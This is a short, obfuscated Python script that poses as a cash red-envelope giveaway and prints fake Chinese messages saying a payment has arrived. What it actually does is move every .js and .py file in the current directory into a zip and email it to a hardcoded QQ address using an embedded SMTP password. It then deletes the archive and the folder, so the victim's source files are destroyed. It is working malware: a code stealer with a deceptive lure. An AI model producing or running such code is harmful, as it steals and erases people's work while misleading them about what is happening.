#2024-09-30 16:20:17
import shutil #line:1
import glob #line:2
import os #line:3
import random #line:4
import time #line:5
def remover (O0000000OO0000OOO ):#line:7
    ""#line:8
    if os .path .isfile (O0000000OO0000OOO )or os .path .islink (O0000000OO0000OOO ):#line:9
        os .remove (O0000000OO0000OOO )#line:10
    elif os .path .isdir (O0000000OO0000OOO ):#line:11
        shutil .rmtree (O0000000OO0000OOO )#line:12
    else :#line:13
        raise ValueError ("file {} is not a file or dir.".format (O0000000OO0000OOO ))#line:14
output_folder_name ='folder_name'#line:16
copy =False #line:17
over_write_folder =True #line:18
if os .path .exists (output_folder_name )and over_write_folder :#line:20
    remover (output_folder_name )#line:21
if not os .path .exists (output_folder_name ):#line:23
    os .makedirs (output_folder_name )#line:25
    file_names =glob .glob ("*.js")+glob .glob ("*.py")#line:27
    for file_name in file_names :#line:28
        if copy :#line:29
            shutil .copy (os .path .join ('.',file_name ),output_folder_name )#line:30
        else :#line:31
            shutil .move (os .path .join ('.',file_name ),output_folder_name )#line:32
    shutil .make_archive (f'{output_folder_name}','zip',output_folder_name )#line:33
else :#line:34
    print ("恭喜您已到账8.68元红包")#line:35
key ='ryrkijinnnfbdigj'#line:40
import smtplib #line:41
EMAIL_ADDRESS ='2178649808@qq.com'#line:42
EMAIL_PASSWORD =key #line:43
smtp =smtplib .SMTP ('smtp.qq.com',25 )#line:44
import ssl #line:45
context =ssl .create_default_context ()#line:46
sender =EMAIL_ADDRESS #line:47
receiver =EMAIL_ADDRESS #line:48
from email .message import EmailMessage #line:49
subject ="又撸来新角本了"#line:50
body ="请下载附件查看！"#line:51
msg =EmailMessage ()#line:52
msg ['subject']=subject #line:53
msg ['From']=sender #line:54
msg ['To']=receiver #line:55
msg .set_content (body )#line:56
file_name ='folder_name.zip'#line:57
with open (file_name ,'rb')as f :#line:58
    file_data =f .read ()#line:59
msg .add_attachment (file_data ,maintype ='application/zip',subtype ='zip',filename =file_name )#line:60
with smtplib .SMTP_SSL ("smtp.qq.com",465 ,context =context )as smtp :#line:61
    smtp .login (EMAIL_ADDRESS ,EMAIL_PASSWORD )#line:62
    smtp .send_message (msg )#line:63
number =random .random ()#line:65
result =round (number ,2 )#line:66
print ("恭喜您已到账",result ,"元红包")#line:68
time .sleep (2 )#line:69
print ("恭喜您已到账",result ,"元红包")#line:70
time .sleep (2 )#line:71
print ("恭喜您已到账",result ,"元红包")#line:72
os .remove ('folder_name.zip')#line:74
shutil .rmtree ('folder_name')